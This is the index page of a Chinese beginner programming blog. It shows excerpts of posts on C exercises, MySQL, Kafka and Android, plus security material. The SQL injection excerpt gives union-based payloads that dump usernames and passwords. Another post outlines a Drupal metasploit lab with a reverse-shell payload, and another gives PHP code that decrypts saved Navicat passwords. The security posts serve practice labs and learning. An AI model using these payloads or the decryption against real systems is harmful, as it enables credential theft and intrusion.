<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="菜鸟程序员博客">
		<meta property="og:title" content="菜鸟程序员博客" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8c576da130720914d3e41fe9e1a0d23e/" rel="bookmark">
			sql注入过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 检测注入点
在url末尾输入？id=1’，请求中的参数为：查询字符串id:1(字符型漏洞要在id后面加上‘，数字型不需要)
判断是否存在SQL注入可能
在末尾加上 and 1=1 --+,返回正常，加上and 1 = 2,报错，说明SQL语句被执行，没有过滤
数据库字段爆破
url id=1' order by 1 --+后面的数字逐渐加1，直到id=m报错 ​ ​ 数据库表爆破
？id=n union select 1,2,3,4,... //n是当id等于n的时候，正好报错，1,2,3,4...可以一直写到m，判断回显位置 ​ ​ 判断数据库信息
？id=n union select 1,database（）,3,user（）,...两个位置是回显位置，找到数据库 ​ ​ 查找所有的数据表名
？id=n union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema='security'--+ 爆表中的列名
?id=n union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users') -- //column是列的意思，table是表的意思，information_schema是数据库系统自带的库 爆账号密码
?id=n union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) --+ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0db58744ecba0f9a23987ae1b07f255a/" rel="bookmark">
			nmap使用指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基本功能：主机发现，端口扫描，应用程序与版本信息侦测，操作系统侦测
附加功能：规避FW/IDS（防火墙）,NSE脚本定制与使用
命令语法格式 默认方式扫描
nmap &lt;目标地址&gt;
全面扫描
nmap -A -T 4 -v &lt;目标地址&gt;
主机发现 目标：确认目标主机是否在线（Alive 处于开启状态）
原理：与ping命令类似，发送探测包到目标主机，如果收到回复，则说明目标主机是开启得到
探测方式：
ICMP ECHO(ping) /TIMESTAMP /NETMASK(子网掩码) 报文
TCP SYN /ACK 报文
SCTP INIT /COOKIE-ECHO报文
.....
主机发现相关命令选项
实例一：局域网内执行Ping扫描
目标：扫描局域网192.168.40.1-192.168.40.254内哪些IP的主机在线
命令：nmap -sP 192.168.40.1-254或nmap -sP 192.168.40.0/24
说明：在局域网内，无论采用哪一种选项，nmap都是通过ARP包来查询IP地址上的主机是否活动的，如果收到ARP回复包，说明主机在线
实例二：跨网段执行Ping扫描
目标：扫描跨网段目标主机192.168.50.5是否在线
命令:nmap -sP 192.168.50.5
说明:扫描跨网段目标主机时，使用-sp或-sn选项，默认情况下Nmap会依次发送4种不同类型的数据包（ICMP echo request,TCP SYN packet to port 443,TCP ACK packet to port 80,ICMP timestamp request)来探测目标主机是否在线，只要收到其中一个包的回复，就证明目标机在线
实例三：--packet-trace的使用
命令：nmap -sP --packet-trace [目标主机] 或者 nmap -sP [目标主机] --packet-trace
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0db58744ecba0f9a23987ae1b07f255a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46d25fe34e090275acaf0196d7e1d694/" rel="bookmark">
			cv2多图拼接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		刚好需要写个脚本实现个小功能，把多张图片合成一张大图，用到的第三方库有numpy和opencv
import numpy as np import cv2 def merge_image(image_list, x_num=2, y_num=2): image_num = len(image_list) frame = np.zeros((720, 1080), dtype=np.uint8) new_image_list = [] x_image_list = [] if image_num%2 == 0: frame = np.zeros((720, 1080), dtype=np.uint8) image = cv2.imread("10005001_1618537982.jpg") for image in image_list: frame = cv2.resize(image, (1080, 720), interpolation=cv2.INTER_AREA) # 每张图片的大小可自行resize new_image_list.append(frame) for x in range(x_num): htich = np.hstack([i for i in new_image_list[y_num*x:y_num*(x+1)]]) x_image_list.append(htich) vtich = np.vstack(x_image_list) else: # 在这里如果图片列表是单数的话，你可以填充一个空白图片 pass return vtich if __name__ == "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/46d25fe34e090275acaf0196d7e1d694/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b5ac1a3561fa42b5056dd8f7e75022c/" rel="bookmark">
			2021-12-16 综合靶机实验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文章仅供学习和参考！
欢迎交流~
目录
一、实验题目：综合靶机实验
二、实验内容：
三、实验环境：
四、实验步骤：
1. 搜索存活靶机，输入命令：
2. 打开浏览器输入搜索到的靶机：
3. 下载插件WappaLyzer：
4. 尝试sql注入：
5. 扫描网站路径：
6. 尝试搜索drupal漏洞，输入命令：
7. 打开msfconsole，输入命令：
8. 寻找exp，输入命令：
9. 选择Rank为excellent 的exp，输入命令：
10. 设置exp中的options，输入命令：
11. 设置payload为php/meterpreter/reverse_tcp，输入命令：
12. 运行模块，输入命令：
13. 寻找flag，输入命令：
14. 查看flag1文件的内容，输入命令：
15. 在shell中搜索settings.php的位置，输入命令：
16. 查看setting.php文件的内容，输入命令：
17. 进到系统shell，尝试登录数据库，输入命令：
18. 登录数据库，输入命令：
19. 查看数据库，输入命令：
20. information_schema是系统数据库，没什么用，所以我们直接看drupaldb数据库，输入命令：
21. 查看各个表中的内容，输入命令：
22. 可以看见flag3的位置(uid为1的用户是不受Drupal权限管制的，具有最高权限），尝试获取flag3
23. 查看password文件，输入命令：
24. 进入目录/home/flag4，并查看文件内容，输入命令：
25. 尝试提权root：
一、实验题目：综合靶机实验 二、实验内容： 1. 使用msf搜索可利用漏洞（drupal)
2. 寻找目标网站的配置文件
3. 数据库管理员提权（更新管理员密码或者添加一个新用户）
4. suid提权的命令（nmap、vim、find、bash、more、less、nano、cp）
三、实验环境： 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b5ac1a3561fa42b5056dd8f7e75022c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8c8e05f62d9dbd3d99c9717f80dc4d9d/" rel="bookmark">
			Android ConstraintLayout 详解及示例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 ConstraintLayout 可让您使用扁平视图层次结构（无嵌套视图组）创建复杂的大型布局。它与 RelativeLayout 相似，其中所有的视图均根据同级视图与父布局之间的关系进行布局，但其灵活性要高于 RelativeLayout，并且更易于与 Android Studio 的布局编辑器配合使用。
ConstraintLayout 的所有功能均可直接通过布局编辑器的可视化工具来使用，因为布局 API 和布局编辑器是专为彼此构建的。 因此，您完全可以使用 ConstraintLayout 通过拖放的形式（而非修改 XML）来构建布局。
一、ConstraintLayout属性讲解 先简单了解一下我们使用ConstraintLayout要用到的一些基本方位属性，如下表所示：
属性描述app:layout_constraintLeft_toLeftOf把A的left side放在B的left side（左边对齐）app:layout_constraintLeft_toRightOf把A的left side放在B的right side（左边相对右边对齐）app:layout_constraintRight_toLeftOf把A的right side放在B的left side（右边相对左边对齐）app:layout_constraintRight_toRightOf把A的right side放在B的right side（右边对齐）app:layout_constraintTop_toTopOf把A的top side放在B的top side（顶部对齐）app:layout_constraintTop_toBottomOf把A的top side放在B的bottom side（顶部相对底部对齐）app:layout_constraintBottom_toTopOf把A的bottom side放在B的top side（底部相对顶部对齐）app:layout_constraintBottom_toBottomOf把A的bottom side放在B的bottom side（底部对齐）app:layout_constraintStart_toEndOf把A的start position放在B的end position（起始位置相对结束位置对齐）app:layout_constraintStart_toStartOf把A的start position放在B的start position（起始位置对齐）app:layout_constraintEnd_toStartOf把A的end position放在B的start position（结束位置相对起始位置对齐）app:layout_constraintEnd_toEndOf把A的end position放在B的end position（结束位置对齐）app:layout_constraintBaseline_toBaselineOf把A的bottom side放在B的top side（基准线对齐） 注意：属性的命名空间是app
二、偏斜(Bias) 在使用LinearLayout的时候，我们通常会使用Gravity来将水平或者垂直排列的控件按照权重的分配进行排列。而在ConstraintLayout中，它提供了bias属性来对控件进行权重的分配。
代码如下（示例）：
&lt;android.support.constraint.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" xmlns:tools="http://schemas.android.com/tools" android:layout_width="match_parent" android:layout_height="match_parent"&gt; &lt;Button android:id="@+id/button2" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginTop="8dp" android:layout_marginBottom="8dp" android:text="A" app:layout_constraintBottom_toBottomOf="parent" app:layout_constraintHorizontal_bias="0.25" app:layout_constraintLeft_toLeftOf="parent" app:layout_constraintRight_toRightOf="parent" app:layout_constraintTop_toTopOf="parent" /&gt; &lt;/android.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8c8e05f62d9dbd3d99c9717f80dc4d9d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0bb2255e68bc8d9e45e63480ea3ec768/" rel="bookmark">
			关于四位数的反向输出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个题我在昨天晚上写的时候，发现了很多种解法，现在分享一下自己的思路来给需要的人。
1.利用int类型直接取整来求出目标数（从四位数的前面往后面开始读取）
#include&lt;stdio.h&gt;// int main()//将一个四位数，反向输出。 { int a, b, c, d, e; scanf_s("%d", &amp;a); b = int(a / 1000);//1 c = int((a - b * 1000) / 100); d = int((a - b * 1000 - c * 100) / 10); e = int((a - b * 1000 - c * 100 - d * 10)); //printf("%d", e*1000+d*100+c*10+b);//输出的是一个整数 printf("%d%d%d%d", e,d,c,b); return 0; } 我的思路是首先设置四个数来分别取万位，千位，百位，个位。
就用取c，也就是取千位来说，用万位来减去原来的数，然后嘞个数成为一个三位数然后用/求出千位，后面也同理。
但是这个过程写的太离谱了，走了很多弯路，而且我昨天在VS2019可以运行成功但是在牛客网上不可以。因此我换了第二种方法。
2.利用求余数来算（从四位数的后面开始往前面读取）
#include&lt;stdio.h&gt; int main()//将一个四位数，反向输出。 { int a, b, c, d, e; scanf_s("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0bb2255e68bc8d9e45e63480ea3ec768/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9dd89ab5384bb33065315fc03947a043/" rel="bookmark">
			Kafka高性能核心——pageCache与zeroCopy
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PageCache与ZeroCopy PageCache即页面缓存，它是操作系统实现的一种主要的磁盘缓存，它的目的就是减少对磁盘IO的操作。
具体来说，就是把磁盘中的数据缓存到内存里，然后把对磁盘的访问变成对内存的访问。
目前很多一些主流的框架或者架构设计，为了弥补性能上的差异，基本上都是用“磁盘”做缓存的，也就是说可以把所有内存当做磁盘用。
相信很多做过高并发项目的一些小伙伴们都会知道，我们一开始最早期可能会读关系型数据库，关系型数据库一旦压力大了，大家可能就会想到的策略是分库分表，分库分表也可能不满足我们的需求，就有可能会用一些非关系型数据库，或者remote cache，比如redis这种，那么像一些入口级别流量非常非常高的话，可能你的redis都扛不住，这个时候我们就可能借助于内存。
比如在我们的磁盘中有一个1.txt，我们想把它读到应用程序里，那对于OS级别做了哪些事情呢？
当一个进程准备去读取磁盘上内容的时候，操作系统首先不会去准备读磁盘文件，而是先检查在PageCache中是否存在，如果存在那就说明是命中了，直接把数据返回，这样就减少对物理盘的IO操作。如果缓存页不存在，那么这时候才会发起一次IO请求，然后把读取到的数据先加入缓存页，最后再返回给进程，这个也可以理解为就是一个空间换时间。
读数据是这样做的，那么如果是写呢？
如果有一个文件，我想写入磁盘中，那同样操作系统也会检查这个数据是否存在缓存页中，如果不存在它就会在缓存页中添加相应的页，然后把数据写到页里面，然后修改过的页也就变成脏页了，操作系统会在合适的时机把脏页中的数据刷到磁盘里，以保证数据的一致性。
上述就是一个最简单的文件读写的过程。
那如果我们想把磁盘中的文件读到内存里，然后读到应用程序里，再写入到另外一个应用程序，那这个过程它会经过哪些过程呢？
我们来看一下这幅图：
我们废话不多说，看下面这幅图：
首先，我们看最右侧，操作系统会先把物理磁盘中的内容先写到内核读取的缓冲区，这是操作系统级别的，属于内核空间上下文。
左边这一块就是用户缓冲区，属于应用程序的上下文。
然后用户缓冲区会读取操作系统级别的内核缓冲区中的数据，这个时候应用程序里就有数据了。那如果再想把它写入到另外一个应用程序，就需要再从应用缓冲区把数据写入到内核缓冲区，然后再把数据转入到Socket缓冲区，然后到达实际的物理网口，最后通过网络传给另一个消费者。
这个就是我们一个正常的文件读取然后写入到另外一端的过程，它会经历好几次的Copy，第一次Copy到内核中，第二次Copy是到用户缓冲区，然后又从用户缓冲区Copy到操作系统内核缓存，最后再拷贝到Socket的缓冲区，再写入到网卡，一共经历了四次的Copy，这是我们一个传统文件的读写。
而Kafka采用的是零拷贝，节省了很多次Copy，我们来看看Kafka对一个文件是怎么做的呢？
因为我们Kafka都是采用Pull的机制，消费者在读取数据的时候，肯定是需要将服务端的磁盘文件中数据读取出来，通常情况下，我们Kafka会有多个订阅者，生产者发布的消息会被不同的消费者多次消费，为了优化这个流程，Kafka内部就是采用了ZeroCopy，Kafka大量使用了缓存页和ZeroCopy这也是它高性能非常非常至关重要的原因。
虽然消息都是被写到缓存页的，然后由操作系统负责具体的刷盘策略和刷盘任务。
我们看下图：
这个图就是描述了一个经典的ZeroCopy技术了，它跟应用程序是完全没有关联的，我们右边应用程序完全不做任何Copy，磁盘文件只在用户内核的空间上下文做一次Copy，然后直接写到网卡，也就是说我们ZeroCopy只是把磁盘文件复制到了页面缓存，然后把数据从页面缓存直接发送到网卡中，也就是说发送给不同的订阅者的时候，都可以使用同一个页面缓存，而避免了重复复制的操作。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01f10f2a3c8e24f81314274794440ba2/" rel="bookmark">
			Windows使用bat脚本实现MySQL的启动与关闭
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Windows下 手动启动服务
mysqld --console　或　net start mysql　手动关闭服务
mysqladmin -uroot shudown　或　net stop mysql　bat脚本：如下
@echo off for /f "skip=3 tokens=4" %%i in ('sc query mysql') do set "zt=%%i" &amp;goto :next :next if /i "%zt%"=="RUNNING" ( echo 已经发现该服务正在运行，正在已经关闭服务 net stop mysql ) else ( echo 该服务现在处于停止状态，正在现在开启服务 net start mysql ) exit pause
功能：MySQL启动着进行关闭，关闭则进行启动
双击以管理员身份运行
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6828c5b2eab52282dec201e75583b096/" rel="bookmark">
			聚簇索引、非聚簇索引、普通索引、唯一索引
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、聚簇索引 VS 非聚簇索引 聚簇索引：将数据存储与索引放到了一块，找到索引也就找到了数据非聚簇索引：将数据存储于索引分开结构，索引结构的叶子节点指向了数据的对应行，myisam通过key_buffer把索引先缓存到内存中，当需要访问数据时（通过索引访问数据），在内存中直接搜索索引，然后通过索引找到磁盘相应数据，这也就是为什么索引不在key buffer命中时，速度慢的原因 澄清一个概念：innodb中，在聚簇索引之上创建的索引称之为辅助索引，辅助索引访问数据总是需要二次查找（回表），非聚簇索引都是辅助索引，像复合索引、前缀索引、唯一索引，辅助索引叶子节点存储的不再是行的物理位置，而是主键值。
二、何时使用聚簇索引与非聚簇索引 聚簇索引具有唯一性 由于聚簇索引是将数据跟索引结构放到一块，因此一个表仅有一个聚簇索引
一个误区：把主键自动设为聚簇索引 聚簇索引默认是主键，如果表中没有定义主键，InnoDB 会选择一个唯一的非空索引代替。如果没有这样的索引，InnoDB 会隐式定义一个主键来作为聚簇索引。InnoDB 只聚集在同一个页面中的记录。包含相邻键值的页面可能相距甚远。如果你已经设置了主键为聚簇索引，必须先删除主键，然后添加我们想要的聚簇索引，最后恢复设置主键即可。此时其他索引只能被定义为非聚簇索引。这个是最大的误区。有的主键还是无意义的自动增量字段，那样的话Clustered index对效率的帮助，完全被浪费了。刚才说到了，聚簇索引性能最好而且具有唯一性，所以非常珍贵，必须慎重设置。一般要根据这个表最常用的SQL查询方式来进行选择，某个字段作为聚簇索引，或组合聚簇索引，这个要看实际情况。记住我们的最终目的就是在相同结果集情况下，尽可能减少逻辑IO。
结合图再仔细点看
InnoDB使用的是聚簇索引，将主键组织到一棵B+树中，而行数据就储存在叶子节点上，若使用"where id = 14"这样的条件查找主键，则按照B+树的检索算法即可查找到对应的叶节点，之后获得行数据。若对Name列进行条件搜索，则需要两个步骤：第一步在辅助索引B+树中检索Name，到达其叶子节点获取对应的主键。第二步使用主键在主索引B+树种再执行一次B+树检索操作，最终到达叶子节点即可获取整行数据。（重点在于通过其他键需要建立辅助索引） MyISM使用的是非聚簇索引，非聚簇索引的两棵B+树看上去没什么不同，节点的结构完全一致只是存储的内容不同而已，主键索引B+树的节点存储了主键，辅助键索引B+树存储了辅助键。表数据存储在独立的地方，这两颗B+树的叶子节点都使用一个地址指向真正的表数据，对于表数据来说，这两个键没有任何差别。由于索引树是独立的，通过辅助键检索无需访问主键的索引树。
三、聚簇索引的优势 看上去聚簇索引的效率明显要低于非聚簇索引，因为每次使用辅助索引检索都要经过两次B+树查找，这不是多此一举吗？聚簇索引的优势在哪？
由于行数据和叶子节点存储在一起，同一页中会有多条行数据，访问同一数据页不同行记录时，已经把页加载到了Buffer中，再次访问的时候，会在内存中完成访问，不必访问磁盘。这样主键和行数据是一起被载入内存的，找到叶子节点就可以立刻将行数据返回了，如果按照主键Id来组织数据，获得数据更快。辅助索引使用主键作为"指针"而不是使用地址值作为指针的好处是，减少了当出现行移动或者数据页分裂时辅助索引的维护工作，使用主键值当作指针会让辅助索引占用更多的空间，换来的好处是InnoDB在移动行时无须更新辅助索引中的这个"指针"。也就是说行的位置（实现中通过16K的Page来定位）会随着数据库里数据的修改而发生变化（前面的B+树节点分裂以及Page的分裂），使用聚簇索引就可以保证不管这个主键B+树的节点如何变化，辅助索引树都不受影响。聚簇索引适合用在排序的场合，非聚簇索引不适合取出一定范围数据的时候，使用用聚簇索引二级索引需要两次索引查找，而不是一次才能取到数据，因为存储引擎第一次需要通过二级索引找到索引的叶子节点，从而找到数据的主键，然后在聚簇索引中用主键再次查找索引，再找到数据可以把相关数据保存在一起。例如实现电子邮箱时，可以根据用户 ID 来聚集数据，这样只需要从磁盘读取少数的数据页就能获取某个用户的全部邮件。如果没有使用聚簇索引，则每封邮件都可能导致一次磁盘 I/O。 四、聚簇索引的劣势 维护索引很昂贵，特别是插入新行或者主键被更新导至要分页(page split)的时候。建议在大量插入新行后，选在负载较低的时间段，通过OPTIMIZE TABLE优化表，因为必须被移动的行数据可能造成碎片。使用独享表空间可以弱化碎片表因为使用UUId（随机ID）作为主键，使数据存储稀疏，这就会出现聚簇索引有可能有比全表扫面更慢，
所以建议使用int的auto_increment作为主键
主键的值是顺序的，所以 InnoDB 把每一条记录都存储在上一条记录的后面。当达到页的最大填充因子时（InnoDB 默认的最大填充因子是页大小的 15/16，留出部分空间用于以后修改），下一条记录就会写入新的页中。一旦数据按照这种顺序的方式加载，主键页就会近似于被顺序的记录填满（二级索引页可能是不一样的）。如果主键比较大的话，那辅助索引将会变的更大，因为辅助索引的叶子存储的是主键值；过长的主键值，会导致非叶子节点占用占用更多的物理空间
五、为什么主键通常建议使用自增id 聚簇索引的数据的物理存放顺序与索引顺序是一致的，即：只要索引是相邻的，那么对应的数据一定也是相邻地存放在磁盘上的。如果主键不是自增id，那么可以想象，它会干些什么，不断地调整数据的物理地址、分页，当然也有其他一些措施来减少这些操作，但却无法彻底避免。但，如果是自增的，那就简单了，它只需要一 页一页地写，索引结构相对紧凑，磁盘碎片少，效率也高。因为MyISAM的主索引并非聚簇索引，那么他的数据的物理地址必然是凌乱的，拿到这些物理地址，按照合适的算法进行I/O读取，于是开始不停的寻道不停的旋转。聚簇索引则只需一次I/O。（强烈的对比）。不过，如果涉及到大数据量的排序、全表扫描、count之类的操作的话，还是MyISAM占优势些，因为索引所占空间小，这些操作是需要在内存中完成的。
六、mysql中聚簇索引的设定 聚簇索引默认是主键，如果表中没有定义主键，InnoDB 会选择一个唯一的非空索引代替。如果没有这样的索引，InnoDB 会隐式定义一个主键来作为聚簇索引。InnoDB 只聚集在同一个页面中的记录。包含相邻健值的页面可能相距甚远。
七、普通索引 由key或者index定义，允许被索引的数据列包含重复数值，例如普通索引index(id,nane)，id=1，name=a;id=2,name=a）是可以存在的。普通索引主要目的就是提高数据访问速度。
八、唯一索引 由unique定义，不允许被索引的数据列包含重复数值。主键索引是一种特殊的唯一索引，由primary key定义
九、例子 mysql&gt; create table user( -&gt; id int(10) auto_increment, -&gt; name varchar(30), -&gt; age tinyint(4), # 主键索引，唯一索引 -&gt; primary key (id), # 唯一索引 -&gt; index idx_age (age)//注意此处建立了age的索引 -&gt; )engine=innodb charset=utf8mb4; # 联合索引，普通索引 -&gt; create index ind_age_name on user(age,name); 文章部分转自
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3adb6a1b372038408a90edb61ae6735/" rel="bookmark">
			区块链的跨链技术
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：
区块链是属于分布式账本技术的一种，每一个区块链都是一个独立的账本，通常区块链之间是无法实现价值转移的。但是随着市场的发展，有了市场的新需求，需求为：要求不同的链之间要协同操作，以及实现价值流通，所以有了跨链技术。
跨链技术作用： 不同的链之间要协同操作，互联互通
实现价值流通
什么是跨链技术： 指存储在特点区块链上的资产可以 转移到另一条区块链上，从而实现价值的流通，就是一种兑换行为。
例如：从比特币转换为以太坊币
跨链技术在区块链企业业务中的应用： 零售场景 从生产到销售这一过程是可以写到一个大的区块链中的，但是处于成本和数据隐私的考虑，很难写到一个区块链中，把一个场景分成上游和下游。他们两个自成一个区块链。
跨链技术在这里面的作用：打通，连接上下游。
例如：现实社会中，买家能直接找到生产者，这样子销售者就没有饭吃了。所以把生产者到销售者分为上游，销售者到买家分成下游。
跨链技术的问题： 1、交易验证问题：如何保证多个区块链之间的信任问题，一个区块链如何验证另一个区块链上的交易。
2、事务管理问题：跨链交易是包括多个子交易的，如何保证这些子交易能够永不回滚，最终被确认，以及保证交易的原子性(要么全成功，要么全不成功)。
解决方案： 1、侧链
一开始的侧链目的：为了实现比特币和其他数字资产在多个链之间转移的。
现在的侧链：区块链代币(比特币、token币)可以在不同的区块链之间转移。
注意：上图说明主链和侧链之间的数据是可以交换的
侧链工作模式：单一托管、合约联盟
侧链实例： BTC-Relay
被认为是区块链中的第一个侧链，
作用：把比特币网络和以太坊网络连接在一起，可以实现在以太坊网络中进行比特币交易。
Element (元素链)
特点：私密交易
正常的交易中，比特币的地址就是隐私保护，并且要公开交易信息让其他节点验证。元素链引入了一个新的地址类型，叫做私密地址。
私密地址：只是比原来的比特币地址长，只是加入了盲化因子，可以使比特币的地址变长，并且导致参与交易双方知道交易金额，
中继
在两个区块链之间加入一个数据结构(什么数据结构都可以)，
作用：让两个区块链通过这个数据结构可以进行数据交互，
哈希锁定
通过时间戳和hash值来达到资产的交换，只能进行交换，不能进行资产的转移。
交换：等价的东西进行交换。转移：白给
2、公证人机制
中介：就是一个认证的作用
在这个模式下面，通过外部的公证人验证跨链信息的可靠性，一旦通过验证，公证人必须要在这个信息中签名。
典型的代表：跨链价值传输协议（ILP）
流程：
1、由发送者到接受者 （托管创建）
2、由接受者到发送者 （托管确认）
发送者、接受者、连接者
托管：在交易里面，托管就是帮忙管理交易的。比如我转移一笔钱，会先创建一个托管，这个时候资产不会真正的发生转移，是先把钱转到托管中，只有当接受者确认了这笔交易之后，钱才会真的发生转移。例如：淘宝购物。
企业场景的应用 超级账本：引入了通道的概念，每一个通道都是一个独立的区块链账本，支持并行运行。通过使用分布式事务技术，实现多个账本之间的协同和一致性。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a9afb077b3ba7b7d5346a016be48fdd/" rel="bookmark">
			Navicat怎样查看数据库密码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.第一步导出链接 2.一定要勾选导出密码！！！！！！！！！！！！！
3.找到加密密码，进行破解
在导出的connections.ncx文件中找到password，然后复制出来
打开这个网址：https://tool.lu/coderunner，将如下刚刚密码复制进去，
$decode = $navicatPassword-&gt;decrypt(‘复制出来的密码’);
&lt;?php class NavicatPassword { protected $version = 0; protected $aesKey = 'libcckeylibcckey'; protected $aesIv = 'libcciv libcciv '; protected $blowString = '3DC5CA39'; protected $blowKey = null; protected $blowIv = null; public function __construct($version = 12) { $this-&gt;version = $version; $this-&gt;blowKey = sha1('3DC5CA39', true); $this-&gt;blowIv = hex2bin('d9c7c3c8870d64bd'); } public function encrypt($string) { $result = FALSE; switch ($this-&gt;version) { case 11: $result = $this-&gt;encryptEleven($string); break; case 12: $result = $this-&gt;encryptTwelve($string); break; default: break; } return $result; } protected function encryptEleven($string) { $round = intval(floor(strlen($string) / 8)); $leftLength = strlen($string) % 8; $result = ''; $currentVector = $this-&gt;blowIv; for ($i = 0; $i &lt; $round; $i++) { $temp = $this-&gt;encryptBlock($this-&gt;xorBytes(substr($string, 8 * $i, 8), $currentVector)); $currentVector = $this-&gt;xorBytes($currentVector, $temp); $result .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a9afb077b3ba7b7d5346a016be48fdd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df8902c288b4e037b813aa555684aa9f/" rel="bookmark">
			初学C语言----反向输出一个四位数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目：将一个四位数，反向输出。
(针对每组输入，反向输出对应四位数。)
示例 输入： 1234
输出： 4321 方法一：可以利用求余运算然后每次对10求商即可
#include &lt;stdio.h&gt;
int main() {
int n = 0;
scanf("%d", &amp;n);
//利用求余获取a的最后一位，以此类推
printf("%d", n% 10);
n /= 10;
printf("%d", n% 10);
n /= 10;
printf("%d", n% 10);
n /= 10;
printf("%d\n", n);
return 0;
}
方法二：在方法一的基础之上加上while循环
#include&lt;stdio.h&gt;
int main()
{
int n = 0;
scanf("%d", &amp;n);
while(n)
{
printf("%d", n%10);
n = n/10;
}
return 0;
}
方法三: 将数字以字符串读入，只要输出字符串后四位即可
#include &lt;stdio.h&gt;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/df8902c288b4e037b813aa555684aa9f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e691af437ec8ced1114695263cc3cf2/" rel="bookmark">
			SQL语言实现MYSQL表的复制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		create table table_name select * from table_name 。这种复制表，显然只是复制了表的数据，表的结构，包括索引等一些，都没有复制。
所以复制表时要先复制表结构，
create table table_name like table_name;
insert into table_name select * from table_name;
这样，才能较完整的复制一张表
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09d059dcc197e045d99eee704047d009/" rel="bookmark">
			C语言训练-亲密数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目描述 两个不同的自然数A和B，如果整数A的全部因子(包括1，不包括A本身)之和等于B；且整数B的全部因子(包括1，不包括B本身)之和等于A，则将整数A和B称为亲密数。求3000以内的全部亲密数。
输入 无
输出 3000以内的全部亲密数(输出格式:(A,B)，不加换行，不加分隔符号)
一对亲密数只输出一次, 小的在前
样例输入 无
样例输出 (220,284)(1184,1210)(2620,2924)
完整代码 #include &lt;stdio.h&gt; int fc(int a) //求自然数的因子之和 { int i, sum = 0; for (i = 1; i &lt; a; i++) { if (a % i == 0) { sum += i; } } return sum; } int main() { int a, b; for (a = 2; a &lt;= 3000; a++) //输出3000以下的亲密数 { b = fc(a);	//假设a的全部因子都等于b; if (fc(b) == a &amp;&amp; a !
	</div>
	<div class="list__footer clearfix">
